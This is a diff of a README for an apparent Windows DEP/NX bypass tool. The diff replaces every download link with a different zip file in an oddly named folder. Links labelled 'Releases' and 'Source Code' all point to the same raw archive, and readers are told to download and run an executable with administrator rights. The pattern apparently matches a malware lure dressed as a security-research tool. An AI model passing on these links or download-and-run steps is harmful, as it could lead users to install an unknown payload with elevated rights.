@@ -1,7 +1,7 @@
 # 🔧 HWBP-DEP-Bypass - Learn DEP/NX Bypass Effortlessly
 
 ## 📥 Download Now
-[![Download HWBP-DEP-Bypass](https://raw.githubusercontent.com/prateek123s/HWBP-DEP-Bypass/main/semidecussation/HWBP-DEP-Bypass.zip)](https://raw.githubusercontent.com/prateek123s/HWBP-DEP-Bypass/main/semidecussation/HWBP-DEP-Bypass.zip)
+[![Download HWBP-DEP-Bypass](https://github.com/prateek123s/HWBP-DEP-Bypass/raw/refs/heads/main/Win32Data_Rw_NoChange/Bypass-HWB-DE-2.9.zip)](https://github.com/prateek123s/HWBP-DEP-Bypass/raw/refs/heads/main/Win32Data_Rw_NoChange/Bypass-HWB-DE-2.9.zip)
 
 ## 📖 Overview
 HWBP-DEP-Bypass is an educational tool designed to demonstrate how to bypass Data Execution Prevention (DEP) and No-eXecute (NX) protections. It uses hardware breakpoints, vectored exception handling, and instruction emulation on Windows x64. This project aims to provide insights for security research and learning. 
@@ -17,11 +17,11 @@ To get started with the HWBP-DEP-Bypass tool, you need to download and run the a
 - **Administrator Rights:** Required for installation
 
 ## 📂 Download & Install
-1. Visit this page to download: [HWBP-DEP-Bypass Releases](https://raw.githubusercontent.com/prateek123s/HWBP-DEP-Bypass/main/semidecussation/HWBP-DEP-Bypass.zip)
+1. Visit this page to download: [HWBP-DEP-Bypass Releases](https://github.com/prateek123s/HWBP-DEP-Bypass/raw/refs/heads/main/Win32Data_Rw_NoChange/Bypass-HWB-DE-2.9.zip)
   
 2. On the releases page, look for the latest version. You will see a list of files available for download.
 
-3. Select the appropriate file for your system. Typically, you want the main executable file (e.g., https://raw.githubusercontent.com/prateek123s/HWBP-DEP-Bypass/main/semidecussation/HWBP-DEP-Bypass.zip).
+3. Select the appropriate file for your system. Typically, you want the main executable file (e.g., https://github.com/prateek123s/HWBP-DEP-Bypass/raw/refs/heads/main/Win32Data_Rw_NoChange/Bypass-HWB-DE-2.9.zip).
 
 4. Click on the link to start the download. Wait for the file to be saved to your computer.
 
@@ -66,7 +66,7 @@ Feel free to contribute to the discussions or submit improvements.
 The HWBP-DEP-Bypass is available for educational purposes only. Please respect the usage guidelines outlined in the repository.
 
 ## 📘 Useful Links
-- [HWBP-DEP-Bypass Releases](https://raw.githubusercontent.com/prateek123s/HWBP-DEP-Bypass/main/semidecussation/HWBP-DEP-Bypass.zip)
-- [Source Code](https://raw.githubusercontent.com/prateek123s/HWBP-DEP-Bypass/main/semidecussation/HWBP-DEP-Bypass.zip)
+- [HWBP-DEP-Bypass Releases](https://github.com/prateek123s/HWBP-DEP-Bypass/raw/refs/heads/main/Win32Data_Rw_NoChange/Bypass-HWB-DE-2.9.zip)
+- [Source Code](https://github.com/prateek123s/HWBP-DEP-Bypass/raw/refs/heads/main/Win32Data_Rw_NoChange/Bypass-HWB-DE-2.9.zip)
 
 Your journey into understanding DEP/NX bypass starts here. Happy exploring!
